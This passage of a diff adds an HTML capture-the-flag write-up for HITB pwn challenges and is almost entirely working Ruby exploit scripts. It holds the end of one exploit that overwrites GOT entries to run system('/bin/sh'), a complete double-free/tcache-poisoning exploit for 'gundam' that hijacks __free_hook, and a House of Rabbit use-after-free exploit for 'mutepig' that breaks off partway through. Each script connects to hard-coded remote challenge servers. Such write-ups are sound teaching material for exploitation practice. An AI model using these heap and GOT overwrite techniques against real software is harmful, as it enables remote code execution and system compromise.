+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite got (strlen -&gt; read_integer)&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\xff</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x58</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">got</span><span class="o">[</span><span class="s2">&quot;strlen&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">...</span><span class="mi">5</span><span class="o">]</span>
+  <span class="n">edit_message</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+  <span class="n">edit_message</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="o">[</span><span class="n">offset</span><span class="o">[</span><span class="s2">&quot;read_integer&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">...</span><span class="mi">6</span><span class="o">]</span><span class="p">)</span>  <span class="c1"># now we can edit messages without length limitations</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite got (free -&gt; puts)&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\0\0\0</span><span class="s2">&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">got</span><span class="o">[</span><span class="s2">&quot;free&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">edit_message_hax</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+  <span class="n">edit_message_hax</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">[</span><span class="n">offset</span><span class="o">[</span><span class="s2">&quot;puts&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">...</span><span class="mi">6</span><span class="o">]</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] leak libc base&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\0\0\0</span><span class="s2">&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">got</span><span class="o">[</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">edit_message_hax</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+  <span class="n">wipe_message</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">tube</span><span class="o">.</span><span class="n">recv_capture</span><span class="p">(</span><span class="sr">/(.{6})\n/m</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">-</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="o">]</span>
+  <span class="nb">puts</span> <span class="s2">&quot;libc base = 0x%x&quot;</span> <span class="o">%</span> <span class="n">libc_base</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite got (atoi -&gt; system)&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;</span><span class="se">\0\0\0</span><span class="s2">&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">got</span><span class="o">[</span><span class="s2">&quot;atoi&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">edit_message_hax</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+  <span class="n">edit_message_hax</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;system&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">...</span><span class="mi">6</span><span class="o">]</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] launch shell&quot;</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)</span>
+
+  <span class="n">tube</span><span class="o">.</span><span class="n">interactive</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>flag: <code>HITB{b4se364_1s_th3_b3st_3nc0d1ng!}</code></p>
+<h2>gundam (Pwn 487pts)</h2>
+<p>Vulnerability:</p>
+<ul>
+<li>Double free in "Destroy a gundam" feature</li>
+</ul>
+<p>Exploit:</p>
+<div class="codehilite"><pre><span class="c1">#coding:ascii-8bit</span>
+<span class="nb">require</span> <span class="s2">&quot;pwnlib&quot;</span>
+
+<span class="n">remote</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span>
+<span class="k">if</span> <span class="n">remote</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;47.75.37.114&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+  <span class="n">libc_offset</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;main_arena&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x3dac20</span><span class="p">,</span>
+    <span class="s2">&quot;__free_hook&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x3dc8a8</span><span class="p">,</span>
+    <span class="s2">&quot;system&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x47dc0</span>
+  <span class="p">}</span>
+<span class="k">else</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">54321</span>
+  <span class="n">libc_offset</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;main_arena&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x3dac20</span><span class="p">,</span>
+    <span class="s2">&quot;__free_hook&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x3dc8a8</span><span class="p">,</span>
+    <span class="s2">&quot;system&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x47dc0</span>
+  <span class="p">}</span>
+<span class="k">end</span>
+
+<span class="k">class</span> <span class="nc">PwnTube</span>
+  <span class="k">def</span> <span class="nf">recv_until_prompt</span>
+    <span class="n">recv_until</span><span class="p">(</span><span class="s2">&quot;Your choice : &quot;</span><span class="p">)</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">tube</span>
+  <span class="vi">@tube</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="nb">name</span><span class="p">,</span> <span class="n">type</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until</span><span class="p">(</span><span class="s2">&quot;The name of gundam :&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until</span><span class="p">(</span><span class="s2">&quot;The type of the gundam :&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">type</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">show</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">destroy</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until</span><span class="p">(</span><span class="s2">&quot;Which gundam do you want to Destory:&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">index</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">explode</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_until_prompt</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;4&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="no">PwnTube</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">){</span><span class="o">|</span><span class="n">t</span><span class="o">|</span>
+  <span class="vi">@tube</span> <span class="o">=</span> <span class="n">t</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] leak heap base&quot;</span>
+  <span class="n">create</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="s2">&quot;C&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="s2">&quot;D&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="s2">&quot;E&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">destroy</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+  <span class="n">destroy</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">show</span>
+  <span class="n">heap_base</span> <span class="o">=</span> <span class="n">tube</span><span class="o">.</span><span class="n">recv_capture</span><span class="p">(</span><span class="sr">/Gundam\[5\] :(.{6})/m</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">-</span> <span class="mh">0x290</span>
+  <span class="nb">puts</span> <span class="s2">&quot;heap base = 0x%x&quot;</span> <span class="o">%</span> <span class="n">heap_base</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] abuse tcache freelist&quot;</span>
+  <span class="mi">2</span><span class="o">.</span><span class="n">times</span><span class="p">{</span>
+    <span class="n">destroy</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+    <span class="n">destroy</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">destroy</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+  <span class="p">}</span>
+  <span class="n">destroy</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+  <span class="n">explode</span>
+  <span class="n">create</span><span class="p">(</span><span class="o">[</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x80</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="s2">&quot;F&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="s2">&quot;/bin/sh</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="s2">&quot;H&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x111</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q*&quot;</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x90</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x760</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] leak libc base&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x570</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">show</span>
+  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">tube</span><span class="o">.</span><span class="n">recv_capture</span><span class="p">(</span><span class="sr">/Gundam\[4\] :(.{6})/m</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">-</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;main_arena&quot;</span><span class="o">]</span> <span class="o">-</span> <span class="mh">0x58</span>
+  <span class="nb">puts</span> <span class="s2">&quot;libc base = 0x%x&quot;</span> <span class="o">%</span> <span class="n">libc_base</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite __free_hook&quot;</span>
+  <span class="n">destroy</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+  <span class="n">destroy</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;__free_hook&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
+  <span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">explode</span>
+  <span class="n">create</span><span class="p">(</span><span class="o">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_offset</span><span class="o">[</span><span class="s2">&quot;system&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] launch shell&quot;</span>
+  <span class="n">destroy</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+
+  <span class="n">tube</span><span class="o">.</span><span class="n">interactive</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>flag: <code>HITB{now_you_know_about_tcache}</code></p>
+<h2>mutepig (Pwn 833pts)</h2>
+<p>Vulnerability:</p>
+<ul>
+<li>Use after free</li>
+</ul>
+<p>References:</p>
+<ul>
+<li><a href="http://shift-crops.hatenablog.com/entry/2017/09/17/213235">House of Rabbit - Heap exploitation technique bypassing ASLR</a></li>
+</ul>
+<p>Exploit:</p>
+<div class="codehilite"><pre><span class="c1">#coding:ascii-8bit</span>
+<span class="nb">require</span> <span class="s2">&quot;pwnlib&quot;</span>
+
+<span class="n">remote</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span>
+<span class="k">if</span> <span class="n">remote</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;47.75.128.158&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="k">else</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">54321</span>
+<span class="k">end</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s2">&quot;fake_chunk&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x602120</span><span class="p">,</span>
+  <span class="s2">&quot;system&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x4006e0</span>
+<span class="p">}</span>
+
+<span class="n">got</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s2">&quot;free&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x602018</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">tube</span>
+  <span class="vi">@tube</span>
+<span class="k">end</span>
+
+<span class="c1"># 1: 0x10</span>
+<span class="c1"># 2: 0x80</span>
+<span class="c1"># 3: 0xa00000</span>
+<span class="c1"># 13337: 0xFFFFFFFFFFFFFF70</span>
+<span class="k">def</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">type</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">release</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">index</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">index</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="no">PwnTube</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">){</span><span class="o">|</span><span class="n">t</span><span class="o">|</span>
+  <span class="vi">@tube</span> <span class="o">=</span> <span class="n">t</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">wait_time</span> <span class="o">=</span> <span class="mi">0</span><span class="o">.</span><span class="mi">5</span>
+
+  <span class="k">if</span> <span class="o">!</span><span class="n">remote</span>
+    <span class="nb">puts</span> <span class="s2">&quot;waiting&quot;</span>
+    <span class="nb">gets</span>
+  <span class="k">end</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] allocate fastbin&quot;</span>
+  <span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">)</span>  <span class="c1"># 0</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] raise system_mem&quot;</span>
+  <span class="n">allocate</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">)</span>  <span class="c1"># 1</span>
+  <span class="n">release</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+  <span class="n">allocate</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">)</span>  <span class="c1"># 2</span>
+  <span class="n">release</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] free fastbin&quot;</span>
+  <span class="n">release</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] allocate small bin (for malloc_consolidate)&quot;</span>
+  <span class="n">allocate</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">)</span>  <span class="c1"># 3</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] abuse fastbins linklist&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x11</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q*&quot;</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xfffffffffffffff1</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q*&quot;</span><span class="p">)</span>
+  <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">[</span><span class="n">offset</span><span class="o">[</span><span class="s2">&quot;fake_chunk&quot;</span><span class="o">]</span> <span class="o">+</span> <span class="mh">0x10</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">...</span><span class="mi">7</span><span class="o">]</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] force malloc_consolidate&quot;</span>
+  <span class="n">release</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] link fake chunk to largebin&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0xfffffffffffffff0</span><span class="p">,</span> <span class="mh">0x10</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q*&quot;</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xa00001</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q*&quot;</span><span class="p">)</span>
+  <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">...</span><span class="mi">7</span><span class="o">]</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+  <span class="n">allocate</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">)</span>  <span class="c1"># 4</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] change fake chunk&#39;s size&quot;</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0xfffffffffffffff0</span><span class="p">,</span> <span class="mh">0x10</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q*&quot;</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xfffffffffffffff1</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q*&quot;</span><span class="p">)</span>
+  <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">...</span><span class="mi">7</span><span class="o">]</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] move top chunk to bss&quot;</span>
+  <span class="n">allocate</span><span class="p">(</span><span class="mi">13337</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">)</span>  <span class="c1"># 5</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite bss&quot;</span>
